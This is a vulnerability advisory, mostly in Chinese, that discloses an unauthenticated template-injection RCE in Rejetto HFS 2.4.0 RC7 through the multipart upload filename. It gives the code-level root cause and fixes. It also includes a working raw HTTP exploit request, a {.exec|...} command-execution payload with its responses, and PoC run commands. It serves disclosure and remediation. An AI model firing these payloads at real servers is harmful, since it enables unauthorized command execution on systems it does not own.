# Advisory: HFS 2.x 未授权 RCE — multipart 上传文件名模板注入

| Item | Value |
|---|---|
| **Advisory ID** | WGETNZ-HFS2-2026-001 |
| **Product** | Rejetto HTTP File Server (HFS) 2.x |
| **Affected** | 2.4.0 RC7（build 319，实测）；2.4 全系列（`v2.4-alpha01`–`v2.4-rc07` 及 `master` 的 2.4.0 RC8 源码） |
| **Vulnerability** | 服务端模板注入 → 未授权远程命令执行 |
| **CWE** | CWE-1336（次：CWE-94） |
| **CVSS v3.1** | 9.8 Critical — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| **CVSS v4.0** | 9.3 Critical — `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N` |
| **Authentication** | 无需认证、无需会话、无需用户交互 |
| **Status** | 已向 CNA 申请 CVE 编号 |
| **Author** | [@wgetnz](https://github.com/wgetnz) |

---

## 1. Summary (English)

Rejetto HTTP File Server (HFS) 2.4.0 RC7 inserts the multipart upload `filename` into the server-side template symbol map as the `%item-resource%` symbol **without** applying the `macroQuote()` / `htmlEncode()` escaping that its sibling fields `%item-name%` and `%item-url%` receive. Because the template engine's `xtpl()` routine performs sequential global replacements, a filename that itself contains the text `%item-resource%` is substituted a second time, letting an attacker place an unescaped value into the symbol map. A `:}` sequence inside that value terminates the engine's `{: ... :}` quoting region, so a following `{.exec|...}` macro reaches the macro dispatcher — which applies no authorization check — and is executed as an operating-system command in the context of the HFS process. An unauthenticated attacker achieves remote code execution with a single HTTP request.

This is a **different entry point and a different unescaped sink** from CVE-2024-23692, which covers template injection through the request `search` parameter via `%url%` / `%host%` abuse and whose published record scopes the affected range to `<= 2.3m`. HFS 2.4.0 RC7 is **outside that range**, and the escaping documented in this repository's README is applied to six other request inputs — `urlVar()`, template variable read, Cookie, URL-decoded value, HTTP request header and POST form parameter — while the multipart upload filename is not among them.

---

## 2. 漏洞概述（中文）

HFS 2.4.0 RC7 在处理上传请求时，把上传文件名作为 `%item-resource%` 符号写入模板引擎符号表，但**未做** `macroQuote()` 与 `htmlEncode()` 转义——而相邻的 `%item-name%`、`%item-url%` 两个字段都做了转义。同时模板引擎的 `xtpl()` 是顺序全局替换，因此当文件名本身含有 `%item-resource%` 文本时，该值会被**二次替换**，攻击者由此把一个未转义的值送进符号表。该值中的 `:}` 会提前终结引擎的 `{: ... :}` 引用区，使其后的 `{.exec|...}` 宏被送入宏分发器；而分发器对该分支**不做任何鉴权**，直接以 HFS 进程身份执行操作系统命令。单个 HTTP 请求即可完成，无需认证。

**关键点：这与 CVE-2024-23692 是两个不同的入口点。** 后者走请求 `search` 参数（滥用 `%url%` / `%host%`），其公布记录的受影响范围是 `<= 2.3m`，**不含 2.4.0 RC7**。本 advisory 的入口是 multipart 上传文件名，汇点是 `main.pas:3897` 的 `%item-resource%` 字段。

---

## 3. 技术分析

### 3.1 与 CVE-2024-23692 的差异

| 维度 | CVE-2024-23692 | 本 advisory |
|---|---|---|
| 入口点 | 请求 `search` 查询参数 | multipart 上传文件名 |
| 逃逸手法 | `%25x%25url%25` + 空 `Host` 使 `:%host%}` 塌缩为 `:}` | 文件名内含 `%item-resource%` 触发二次替换，`:}` 直接终结引用区 |
| 未转义汇点 | `%url%` / `%host%` 符号路径 | `main.pas:3897` 的 `%item-resource%` |
| 公布版本范围 | `<= 2.3m`（`defaultStatus: unaffected`） | 实测 **2.4.0 RC7**，不在上一行范围内 |

因此，针对 `search` 路径的编码加固（如本仓库 README 所记录的 `noMacrosAllowed()` 调用点扩展）**不会**覆盖本向量。

### 3.2 数据流 / 触发路径

```
multipart/form-data 的 filename="..."
  → data.uploadSrc := conn.post.filename                       (main.pas 约 5968)
  → 上传被拒 → 文件名进入 uploadResults[].fn
  → addUploadResultsSymbols() 渲染 [upload-failed] 段            (main.pas 3889-3905)
  → '%item-resource%', f.resource+'\'+fn      ← 裸值，无 macroQuote/htmlEncode
  → xtpl() 顺序全局替换：%item-name% 的值里已含字面量 "%item-resource%"，
    随后该处被替换为裸的 f.resource+'\'+fn                      (utillib.pas 2421-2431)
  → 裸值中的 ':' + '}' 提前终结 {: ... :} 引用区
  → '{.exec|...}' 进入 cbMacros 且无鉴权，直接执行                (scriptLib.pas 2313 → 1442)
```

### 3.3 代码定位

`main.pas` 3893-3897 —— 只有 `%item-name%` 被转义，`%item-resource%` 是裸值：

```pascal
files:=files+xtpl(tpl2use[ if_(reason='','upload-success','upload-failed') ],[
  '%item-name%', htmlEncode(macroQuote(fn)),        // 已转义
  '%item-url%', macroQuote(encodeURL(fn)),          // 已转义
  '%item-size%', smartsize(size),
  '%item-resource%', f.resource+'\'+fn,             // ← 未转义（第 3897 行）
  '%idx%', intToStr(i+1),
  '%reason%', reason,
```

`utillib.pas` 2421-2431 —— 顺序全局替换构成「二次替换」：

```pascal
function xtpl(src:string; table:array of string):string; overload;
var i:integer;
begin
i:=0;
while i < length(table) do
  begin
  src:=replaceText(src,table[i],table[i+1]);   // 第 i 步代入的值，可能含有
  inc(i, 2);                                   // 第 j 步(i<j)才替换的符号名
  end;
result:=src;
end; // xtpl
```

`scriptLib.pas` 2313 —— 命令执行宏没有任何鉴权分支：

```pascal
if name = 'exec' then
  exec_();
```

### 3.4 根因

转义被**逐个调用点**施加，而不是在「请求数据进入模板符号表」这一统一信任边界上施加。于是出现两个可叠加的缺陷：`%item-resource%` 把裸文件名带进符号表；`xtpl()` 的顺序替换会把被代入值中的符号名二次展开。任何值一旦进入宏分发器，缺失的鉴权模型使得包括 `{.exec|...}` 在内的所有特权宏均可触达。

---

## 4. 复现

**测试环境**：HFS 2.4.0 RC7 build 319（上游原版发行二进制，SHA-256 `42d14f9efe83cd9d695d0796232bd6e12d276c1262b6cf39d31cfcf64e128f11`）/ Windows 10 x64 / 默认配置 / 非特权账号运行。

### 4.1 模板求值 oracle

`7000788` 在请求报文中不以连续形式出现，故其出现在响应里只能由服务端求值产生：

```
POST / HTTP/1.1
Host: <HOST>:8090
Content-Type: multipart/form-data; boundary=X
Content-Length: <n>
Connection: close

--X
Content-Disposition: form-data; name="f"; filename="%item-resource%:}{.add|7000000|788.}"
Content-Type: application/octet-stream

hi
--X--
```
```
HTTP/1.1 200 OK

[{ "err":"Not allowed.", "name":"\%item-resource%7000788&amp;#58;}7000788" }
]
```

注意**上传本身是被拒绝的**（"Not allowed."）、未落盘任何文件——注入发生在上传失败提示的渲染过程中，因此利用不依赖上传成功。

### 4.2 命令执行

```
filename="%item-resource%:}{.exec|echo ZZRCE7734|timeout=20|out=z.}{.^z.}"
```
```
HTTP/1.1 200 OK

[{ "err":"Not allowed.", "name":"\%item-resource% ZZRCE7734
&amp;#58;} ZZRCE7734
" }
]
```

`ZZRCE7734` 在请求 payload 中不连续出现，故不可能是请求回显。`{.exec|whoami.}` 返回 HFS 进程所运行的服务账号。

### 4.3 PoC 使用

```bash
# 检测（nuclei >= 3.x）
nuclei -t poc/hfs2-upload-filename-ssti.yaml -u http://<TARGET>:8090

# 验证（Python 3，仅标准库；默认经 Burp 代理，USE_BURP=0 直连）
USE_BURP=0 python3 poc/verify_hfs2_upload_ssti.py --target http://<TARGET>:8090
```

> ⚠️ **必须字节级精确投递**：payload 含 `%`、`{`、`}`、`|`、`:}`，部分 HTTP 客户端会在 multipart filename 中将其规范化或 URL 编码，导致 payload 到达不了宏引擎。已实测：`curl --data-binary` 配预制报文可用，`curl -F` 不可用。两个 PoC 均已对目标实际执行并命中。

PoC 只执行算术 oracle 与 `echo`/`whoami`，不含反弹 shell、持久化或横向移动逻辑。

---

## 5. 修复建议

### 5.1 临时缓解

- 不要将 HFS 2.x 暴露于不可信网络；将监听限制在可信内网或 VPN。
- 在反向代理层过滤 multipart `filename` 参数中的 `%`、`{`、`}`、`|`。
- 以受限账号运行 HFS，使其不具备执行命令的能力。
- 若无需上传功能，关闭所有虚拟目录的匿名写权限 —— 注意这只能缓解：注入发生在上传被拒提示的渲染中，不要求上传成功。

### 5.2 根治

**① 在统一的信任边界上转义，隔离裸文件名：**

```pascal
// main.pas, addUploadResultsSymbols()
-        '%item-resource%', f.resource+'\'+fn,
+        '%item-resource%', htmlEncode(macroQuote(f.resource+'\'+fn)),
```

同时建议把 `noMacrosAllowed()`（或等效编码器）应用于 `addUploadResultsSymbols()` / `addProgressSymbols()` 中**所有**来自 `data.uploadResults` / 文件名的字段，而不只是 `%item-name%`、`%item-url%`。

**② 让 `xtpl()` 的替换结果不再参与后续匹配**，使被代入的值不可能再被当作符号名二次扫描：

```pascal
// utillib.pas, xtpl()
-  src:=replaceText(src,table[i],table[i+1]);
+  out:=replaceText(out, table[i], table[i+1]);   // out 只由原始 src 派生一次
```

**③ 为宏分发器引入鉴权模型**，使特权分支在无相应能力时不可触达：

```pascal
// scriptLib.pas
-    if name = 'exec' then
+    if name = 'exec' then
+      if satisfied(md.cd) and accountAllowed(FA_EXEC, md.cd.account) then
         exec_()
+      else macroError('not allowed');
```

> 注意：现有 `satisfied(p)` 只做 `assigned(p)` 判断，无法表达鉴权决策，须替换为真实的权限比较。

### 5.3 修复验证

重放 PoC 应既不出现算术 oracle 值、也不出现命令输出；文件名应呈现字面转义形态（如 `&#37;item-resource&#37;:}`）而非被展开的宏。`poc/hfs2-upload-filename-ssti.yaml` 可直接作为回归测试。

---

## 6. 披露时间线

| 日期 | 事项 |
|---|---|
| 2026-09-16 | 在 HFS 2.4.0 RC7 build 319 上发现并验证（oracle 与命令执行 6/6，含独立验证） |
| 2026-09-16 | 向 CNA 提交 CVE 申请 |
| — | CVE 编号分配后更新此行 |

## 7. References

- 产品源码：https://github.com/rejetto/hfs2
- 相关 CVE：CVE-2024-23692（同类弱点，入口点与未转义汇点均不同，且其公布范围不含 2.4.0 RC7）
- 本仓库对该 CVE 的修复说明：[仓库 README](../../README.md#security--cve-2024-23692)
- 姊妹 advisory（同一产品上另一处独立缺陷）：[`advisories/hfs2-template-macro-missing-authorization`](../hfs2-template-macro-missing-authorization/README.md)
